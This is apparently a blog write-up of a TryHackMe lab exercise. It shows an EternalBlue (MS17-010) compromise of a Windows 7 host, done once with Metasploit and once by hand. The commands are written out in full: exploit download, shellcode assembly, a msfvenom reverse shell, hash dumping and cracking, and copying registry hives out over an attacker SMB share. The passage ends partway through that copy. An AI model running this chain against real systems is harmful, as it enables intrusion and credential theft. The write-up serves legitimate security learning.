---
title: "Blue Boot2Root Write-Up"
date: 2020-11-11T13:43:28-04:00
author: "Nate Catelli"
tags: ["ctf", "boot2root", "hacking", "writeup", "tryhackme"]
description: "A boot2root writeup of the Blue host from TryHackMe"
type: "post"
draft: false
---

## Introduction:
After participating in the Disney Can-You-Hack-It CTF, I've been trying to spend more of my time studying security and offensive penetration testing. My main goal is to balance understanding how to effectively perform an attack with the awesome frameworks out there like metasploit while gaining a better understanding of what this framework is doing under the hood. This post is the first of many that will follow me documenting both the attacks and my methodologies.

## Environment
Both attacks take place in a flat network consisting of my attack host, which is a freshly-booted Kali Linux livecd, and the the target host, a freshly-booted Windows VM that I knew contained 3 flags to capture. No other information is known about the host, like what it's running or its OS version, but I would be lying if I said I didn't assume that this would be an eternalblue attack based off the name.

## Attacking Blue with Metasploit
I started the attack by opening a tmux session and starting meterpreter with `msfdb run` to spin up a postgres instance for persisting scans and recon data.

### Host enumeration
Given that I was investigating a single host, and that I had an unfair suspicion of what kind of attack vector I would be looking for, I started with a default script and service version scan.

```
msf5 > db_nmap -sV -sC -Pn 10.10.201.83
[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-11 01:53 UTC
[*] Nmap: Nmap scan report for ip-10-10-201-83.eu-west-1.compute.internal (10.10.201.83)
[*] Nmap: Host is up (0.00053s latency).
[*] Nmap: Not shown: 991 closed ports
[*] Nmap: PORT      STATE SERVICE      VERSION
[*] Nmap: 135/tcp   open  msrpc        Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)n  tcpwrapped
[*] Nmap: |_ssl-date: 2020-11-11T01:55:05+00:00; 0s from scanner time.
[*] Nmap: 49152/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49153/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49154/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49158/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49160/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: MAC Address: 02:B5:23:84:9D:19 (Unknown)
[*] Nmap: Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Host script results:
[*] Nmap: |_clock-skew: mean: 1h29m59s, deviation: 3h00m00s, median: 0s
[*] Nmap: |_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:b5:23:84:9d:19 (unknown)mb-os-discovery:
[*] Nmap: |   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
[*] Nmap: |   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
[*] Nmap: |   Computer name: Jon-PC
[*] Nmap: |   NetBIOS computer name: JON-PC\x00
[*] Nmap: |   Workgroup: WORKGROUP\x00
[*] Nmap: |_  System time: 2020-11-10T19:54:50-06:00
[*] Nmap: | smb-security-mode:
[*] Nmap: |   account_used: guest
[*] Nmap: |   authentication_level: user
[*] Nmap: |   challenge_response: supported
[*] Nmap: |_  message_signing: disabled (dangerous, but default)
[*] Nmap: | smb2-security-mode:
[*] Nmap: |   2.02:
[*] Nmap: |_    Message signing enabled but not required
[*] Nmap: | smb2-time:
[*] Nmap: |   date: 2020-11-11T01:54:50
[*] Nmap: |_  start_date: 2020-11-11T01:51:00
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 140.63 seconds
```

This initial scan began to confirm my suspicions that this was an eternalblue attack since it looked like the host was a Windows 7 Service Pack 1 machine with SMB available. In addition, this ended up leaking a potential username as the computer's name, which was worth keeping in mind as a potential administrative user going forward. Additionally this pointed out relaxed security setting in the smb service's configuration.

With the information I collected so far, I decided to probe a little further into SMB with an enumaration using nmap's `smb-enum-shares` scripts.

```
msf5 > db_nmap --script smb-enum-shares  -p 445 10.10.201.83
[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-11 01:58 UTC
[*] Nmap: Nmap scan report for ip-10-10-201-83.eu-west-1.compute.internal (10.10.201.83)
[*] Nmap: Host is up (0.00020s latency).
[*] Nmap: PORT    STATE SERVICE
[*] Nmap: 445/tcp open  microsoft-ds
[*] Nmap: MAC Address: 02:B5:23:84:9D:19 (Unknown)
[*] Nmap: Host script results:
[*] Nmap: | smb-enum-shares:
[*] Nmap: |   note: ERROR: Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED) |   account_used: <blank>
[*] Nmap: |   \\10.10.201.83\ADMIN$:
[*] Nmap: |     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
[*] Nmap: |     Anonymous access: <none>
[*] Nmap: |   \\10.10.201.83\C$:
[*] Nmap: |     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
[*] Nmap: |     Anonymous access: <none>
[*] Nmap: |   \\10.10.201.83\IPC$:
[*] Nmap: |     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
[*] Nmap: |_    Anonymous access: READ
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 0.85 seconds
```

This indicated anonymous read access on the IPC share, another piece of evidence pointing to eternalblue as being the attack vector. With this information, I decided I should kick off a quick vuln scan with `nmap` to see if it would infact identify eternalblue. Which it quickly did, as `ms17-010`.

```
msf5 > db_nmap --script vuln  -p 445 10.10.201.83
[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-11 02:03 UTC
[*] Nmap: Nmap scan report for ip-10-10-201-83.eu-west-1.compute.internal (10.10.201.83)
[*] Nmap: Host is up (0.00046s latency).
[*] Nmap: PORT    STATE SERVICE
[*] Nmap: 445/tcp open  microsoft-ds
[*] Nmap: |_clamav-exec: ERROR: Script execution failed (use -d to debug)
[*] Nmap: MAC Address: 02:B5:23:84:9D:19 (Unknown)
[*] Nmap: Host script results:
[*] Nmap: |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
[*] Nmap: |_smb-vuln-ms10-054: false
[*] Nmap: |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
[*] Nmap: | smb-vuln-ms17-010:
[*] Nmap: |   VULNERABLE:
[*] Nmap: |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
[*] Nmap: |     State: VULNERABLE
[*] Nmap: |     IDs:  CVE:CVE-2017-0143
[*] Nmap: |     Risk factor: HIGH
[*] Nmap: |       A critical remote code execution vulnerability exists in Microsoft SMBv1
[*] Nmap: |        servers (ms17-010).
[*] Nmap: |
[*] Nmap: |     Disclosure date: 2017-03-14
[*] Nmap: |     References:
[*] Nmap: |       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
[*] Nmap: |       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
[*] Nmap: |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 15.51 seconds
```

I now had a potential attack vector to explore, but I decided to do a quick recap of the services on the host to make sure I didn't miss anything. This was crucial because I had overlooked an open RDP port, which ended up being important later in the attack.

```
msf5 > services 
Services
========

host          port   proto  name           state  info
----          ----   -----  ----           -----  ----
10.10.201.83  135    tcp    msrpc          open   Microsoft Windows RPC
10.10.201.83  139    tcp    netbios-ssn    open   Microsoft Windows netbios-ssn
10.10.201.83  445    tcp    microsoft-ds   open   Windows 7 Professional 7601 Service Pack 1 microsoft-ds workgroup: WORKGROUP
10.10.201.83  3389   tcp    ms-wbt-server  open   
10.10.201.83  49152  tcp    unknown        open   Microsoft Windows RPC
10.10.201.83  49153  tcp    unknown        open   Microsoft Windows RPC
10.10.201.83  49154  tcp    unknown        open   Microsoft Windows RPC
10.10.201.83  49158  tcp    unknown        open   Microsoft Windows RPC
10.10.201.83  49160  tcp    unknown        open   Microsoft Windows RPC
```

### Preparing an attack
The first step was to check if there were any exploits available for `ms17-010`

```
msf5 > search ms17-010

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index, for example use 5 or use exploit/windows/smb/smb_doublepulsar_rce
```

Since previous scans pointed to the target OS being windows 7, the second option in the list seemed like a perfect candidate. 

```
msf5 > use 2
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf5 exploit(windows/smb/ms17_010_eternalblue) > setg RHOSTS 10.10.201.83
RHOSTS => 10.10.201.83
msf5 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.10.201.83     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.100.83     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
```

I left the default payload as the staged reverse TCP shell, and kicked off an attack to see if I could get a shell.

```
msf5 exploit(windows/smb/ms17_010_eternalblue) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.100.83:4444 
[*] 10.10.201.83:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.201.83:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.201.83:445      - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.201.83:445 - Connecting to target for exploitation.
[+] 10.10.201.83:445 - Connection established for exploitation.
[+] 10.10.201.83:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.201.83:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.201.83:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.201.83:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.201.83:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.201.83:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.201.83:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.201.83:445 - Sending all but last fragment of exploit packet
[*] 10.10.201.83:445 - Starting non-paged pool grooming
[+] 10.10.201.83:445 - Sending SMBv2 buffers
[+] 10.10.201.83:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.201.83:445 - Sending final SMBv2 buffers.
[*] 10.10.201.83:445 - Sending last fragment of exploit packet!
[*] 10.10.201.83:445 - Receiving response from exploit packet
[+] 10.10.201.83:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.201.83:445 - Sending egg to corrupted connection.
[*] 10.10.201.83:445 - Triggering free of corrupted buffer.
[*] Sending stage (201283 bytes) to 10.10.201.83
[*] Meterpreter session 1 opened (10.10.100.83:4444 -> 10.10.201.83:49198) at 2020-11-11 02:08:15 +0000
[+] 10.10.201.83:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.201.83:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.201.83:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

```
msf5 exploit(windows/smb/ms17_010_eternalblue) > sessions -i 1 
[*] Starting interaction with 1...

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```

SUCCESS! And it left me with `NT AUTHORITY\SYSTEM` credentials. At this point the machine was mine, but I had to make sure that I had a stable foothold on the machine before proceeding to search for flags.

### Foothold
The first step was making sure my shell on the host was stable. So I checked my pid and looked to see if I could migrate it to something like the print spooler. 

```
meterpreter > getpid 
Current pid: 1304
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 492   708   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           
 560   552   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.execorsvw.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe    NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exes.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exenlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.execes.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exem.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exesvchost.exe           x64   0        NT AUTHORITY\SYSTEM           
 900   708   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  
 948   708   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    
 1016  660   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exeost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    
 1172  708   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  
 1304  708   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1340  708   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    
 1408  708   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1480  708   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
 1616  708   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 1956  708   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  
 2060  708   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           
 2072  832   WmiPrvSE.exe                                                       
 2184  708   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    
 2220  708   mscorsvw.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe
 2496  708   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM           
 2548  708   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  
 2956  708   vds.exe               x64   0        NT AUTHORITY\SYSTEM           
 2996  708   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
```

Luckily for me it already looked like it was in the injected in the spool service so there was no need to proceed with a migration.

Even though I already knew where this host was running from deploying it, the ps output also established that this host was an EC2 instance via the `ssm-agent`, `LiteAgent` and `Ec2Config` processes. This could have also been observed in the nmap scans via the reverse dns lookup, but I thought it was worth calling out.

Confirmed again with a quick run of the `post/windows/gather/checkvm` module.

```
meterpreter > run post/windows/gather/checkvm 

[*] Checking if JON-PC is a Virtual Machine ...
[+] This is a Xen Virtual Machine
```

Finally I grabbed a sysinfo output to confirm a bunch of information that I had already assumed or known. 

```
meterpreter > sysinfo 
Computer        : JON-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x64/windows
```

With all this information, I attempted to grab a hashdump to pivot from this shell to a longer-lived user.

```
meterpreter > hashdump 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

And of course, there is Jon. With our hashes and users, I dumped these credentials into a file and ran `john` against it with Kali's copy of the `rockyou.txt` password list.

```bash
root@kali:~/ctf/blue# john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
                 (Administrator)
alqfna22         (Jon)
2g 0:00:00:00 DONE (2020-11-11 02:23) 3.076g/s 15692Kp/s 15692Kc/s 15700KC/s alr19882006..alpusidi
Warning: passwords printed above might not be all those cracked
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed
```

With the Jon user's password in hand, I ran the `post/windows/manage/enable_rdp` module and was quickly able to connect as the our Jon admin user.

```
meterpreter > run post/windows/manage/enable_rdp 

[*] Enabling Remote Desktop
[*]   RDP is already enabled
[*] Setting Terminal Services service startup mode
[*]   The Terminal Services service is not set to auto, changing it to auto ...
[*]   Opening port in local firewall if necessary
[*] For cleanup execute Meterpreter resource file: /root/.msf4/loot/20201111022704_default_10.10.201.83_host.windows.cle_997445.txt
```

### Wrapping up
With a new shell I was able to find each of the 3 flags in fairly standard locations on the C:\ drive.

- C:\flag1.txt flag{access_the_machine}
- C:\Windows\system32\config\flag2.txt flag{sam_database_elevated_access}
- C:\Users\Jon\Documents\flag3.txt flag{admin_documents_can_be_valuable}

## Attacking Blue without Metasploit
Now that I had completed the initial attack, I wanted to retry it without the help of metasploit for sourcing, packing and executing the exploit. This imposed the restriction of not having the meterpreter shell to rely on.

Even though I now understood the attack and the host I decided to run through the motions of host enumeration again. For the sake of brevity, I'll avoid repeating some of the callouts unless there are differences with the first attack.

I started with the same nmap scan, the only difference being that I instead supplied `-oA $ATTACKTARGET` to output the results to the host with the target server's ip as a prefix. This functioned to make up for not having the results automatically persisted in `msfdb`.

```
root@kali:~/ctf/scans# export ATTACKTARGET=10.10.87.38
root@kali:~/ctf/scans# nmap -sV -sC -oA $ATTACKTARGET $ATTACKTARGET 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-11 02:45 UTC
Nmap scan report for ip-10-10-87-38.eu-west-1.compute.internal (10.10.87.38)
Host is up (0.00036s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE        VERSION
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds   Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server?
|_ssl-date: 2020-11-11T02:47:18+00:00; 0s from scanner time.
49152/tcp open  msrpc          Microsoft Windows RPC
49153/tcp open  msrpc          Microsoft Windows RPC
49154/tcp open  msrpc          Microsoft Windows RPC
49158/tcp open  msrpc          Microsoft Windows RPC
49160/tcp open  msrpc          Microsoft Windows RPC
MAC Address: 02:FF:5C:EF:7E:F3 (Unknown)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h30m00s, deviation: 3h00m00s, median: 0s
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:ff:5c:ef:7e:f3 (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-11-10T20:47:13-06:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-11-11T02:47:13
|_  start_date: 2020-11-11T02:35:53

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 152.72 seconds
```

```
root@kali:~/ctf/scans# nmap --script smb-enum-shares,smb-enum-users -p 445 -oA "$ATTACKTARGET_smb_enum" $ATTACKTARGET 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-11 02:52 UTC
Nmap scan report for ip-10-10-87-38.eu-west-1.compute.internal (10.10.87.38)
Host is up (0.00077s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 02:FF:5C:EF:7E:F3 (Unknown)

Host script results:
| smb-enum-shares: 
|   note: ERROR: Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED)
|   account_used: <blank>
|   \\10.10.87.38\ADMIN$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\10.10.87.38\C$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\10.10.87.38\IPC$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|_    Anonymous access: READ

Nmap done: 1 IP address (1 host up) scanned in 2.80 seconds
```

```
root@kali:~/ctf/scans# nmap --script vuln -p 445 -oA "$ATTACKTARGET_smb_vuln" $ATTACKTARGET 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-11 02:53 UTC
Nmap scan report for ip-10-10-87-38.eu-west-1.compute.internal (10.10.87.38)
Host is up (0.0011s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
MAC Address: 02:FF:5C:EF:7E:F3 (Unknown)

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

Nmap done: 1 IP address (1 host up) scanned in 15.51 seconds
```

Once agaiin, the scans lead to the same conclusion that the host is vulnerable to eternalblue. So the next step was to hop on google and [exploitdb](https://www.exploit-db.com) to start looking for an exploit. 


### Preparing the attack
The first result that turned up was an exploit from Sleepya [Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010) ](https://www.exploit-db.com/exploits/42031), while google pointed me to [worawit/MS17-010](https://github.com/worawit/MS17-010/). On further inspection they looked to be the same exploit however the worawit link provided shellcode that could be used as the basis for a payload.

Looking further at the [eternalblue_kshellcode_x64.asm shellcode](https://github.com/worawit/MS17-010/blob/master/shellcode/eternalblue_kshellcode_x64.asm), it looked like the shellcode expected a user payload to be appended to the end of the binary both of which still needed to be prepared.

```asm
userland_start:
userland_start_thread:
    ; CreateThread(NULL, 0, &threadstart, NULL, 0, NULL)
    xchg rdx, rax   ; rdx is CreateThread address passed from kernel
    xor ecx, ecx    ; lpThreadAttributes = NULL
    push rcx        ; lpThreadId = NULL
    push rcx        ; dwCreationFlags = 0
    mov r9, rcx     ; lpParameter = NULL
    lea r8, [rel userland_payload]  ; lpStartAddr
    mov edx, ecx    ; dwStackSize = 0
    sub rsp, 0x20
    call rax
    add rsp, 0x30
    ret
    
userland_payload:
```

With all this in mind, I then pulled down the python exploit script and shellcode and assembled the latter with nasm as a flat binary. Then I generated an unstaged tcp reverse shell for windows as a payload, also a flat binary, and joined the contents contents into a single `sc_joined.bin` payload. One pointless thing to note is I added an arbitrary nop sled to the payload. This could have been left out.

```bash
root@kali:~/ctf/scans# cd ../
root@kali:~/ctf# mkdir exploits && cd exploits
root@kali:~/ctf/exploits# curl -o 42031.py https://www.exploit-db.com/raw/42031
root@kali:~/ctf/exploits# curl -sO https://raw.githubusercontent.com/worawit/MS17-010/master/shellcode/eternalblue_kshellcode_x64.asm
root@kali:~/ctf/exploits# nasm -f bin eternalblue_kshellcode_x64.asm -o sc_x64_kernel.bin
root@kali:~/ctf/exploits# msfvenom -p windows/x64/shell_reverse_tcp -a x64 --platform windows -f raw -n100 LPORT=443 LHOST=10.10.47.175 > reverse.bin
No encoder specified, outputting raw payload
Successfully added NOP sled of size 100 from x64/simple
Payload size: 560 bytes
root@kali:~/ctf/exploits# ls
42031.py  eternalblue_kshellcode_x64.asm  reverse.bin  sc_joined.bin  sc_x64_kernel.bin
root@kali:~/ctf/exploits# cat sc_x64_kernel.bin reverse.bin > sc_joined.bin 
```

#### Attacking
To prepare to catch the reverse shell, I started a netcat listener on port 443 in a new terminal before returning to the original to install the single required python dependency `impacket` and kick off the attack.

```bash
root@kali:~# nc -lvnp 443
listening on [any] 443 ...
```

```bash
root@kali:~/ctf/exploits# pip2 install impacket
... 
root@kali:~/ctf/exploits# python2 42031.py $ATTACKTARGET sc_joined.bin 20
shellcode size: 1332
numGroomConn: 20
Target OS: Windows 7 Professional 7601 Service Pack 1
SMB1 session setup allocate nonpaged pool success
SMB1 session setup allocate nonpaged pool success
good response status: INVALID_PARAMETER
done
```

After executing the above, I switched back to our open netcat process to confirm the success of the attack and was happy to find a Windows shell prompt.

```bash
root@kali:~# nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.47.175] from (UNKNOWN) [10.10.87.38] 49170
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

### Foothold
Unlike the first attack I knew this windows shell was extremely limited, and my first priority was to try to egress credentials so that I could escalate to a more stable point of access.

```
C:\Windows\system32>net user
net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Guest                    Jon                      
The command completed with one or more errors.


C:\Windows\system32>cd ../../
cd ../../

C:\>reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\sam C:\sam.save
The operation completed successfully.

C:\>reg.exe save hklm\security C:\security.save
reg.exe save hklm\security C:\security.save
The operation completed successfully.

C:\>reg.exe save hklm\system c:\system.save
reg.exe save hklm\system C:\system.save
The operation completed successfully.

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\

03/17/2019  01:27 PM                24 flag1.txt
07/13/2009  09:20 PM    <DIR>          PerfLogs
04/12/2011  02:28 AM    <DIR>          Program Files
03/17/2019  04:28 PM    <DIR>          Program Files (x86)
11/10/2020  10:18 PM            24,576 sam.save
11/10/2020  10:18 PM            24,576 security.save
11/10/2020  10:19 PM        12,353,536 system.save
12/12/2018  09:13 PM    <DIR>          Users
03/17/2019  04:36 PM    <DIR>          Windows
               4 File(s)     12,402,712 bytes
               5 Dir(s)  20,753,133,568 bytes free

C:\>type flag1.txt
type flag1.txt
flag{access_the_machine}
C:\>
```

The first step was identifying the local users and attempting to dump some crucial registers that I could attack offline. While doing this I happened to dump these registry hives to the root of the `C:\` drive which happened to point out the first flag `flag{access_the_machine}`. In hindsight this was probably a poor choice of location as it would be much more likely to be caught here than in other locations.

Now that I had the hives dumped on disk I still needed to figure out how to egress them to my local machine for further attack. This lead me to reference an example from [ropnop's blog](https://blog.ropnop.com/transferring-files-from-kali-to-windows/#smb) pointing me towards the impacket-smbserver that comes preinstalled on Kali as I could interact with SMB from the cmd shell with out the need to install any further tools or have an interactive shell.

```bash
root@kali:~/# mkdir -p ctf/extractor && cd ctf/extractor

root@kali:~/ctf/extractor# impacket-smbserver BLUE $PWD
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

root@kali:~# netstat -plunt | grep 445
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      1428/python3
```

From the target host I was now able to validate that I could see and connect to the newly started share and promptly copied the hives back to my attack machine.

```
C:\>net view \\10.10.47.175
net view \\10.10.47.175
Shared resources at \\10.10.47.175

(null)

Share name  Type  Used as  Comment  

-------------------------------------------------------------------------------
BLUE        Disk                    
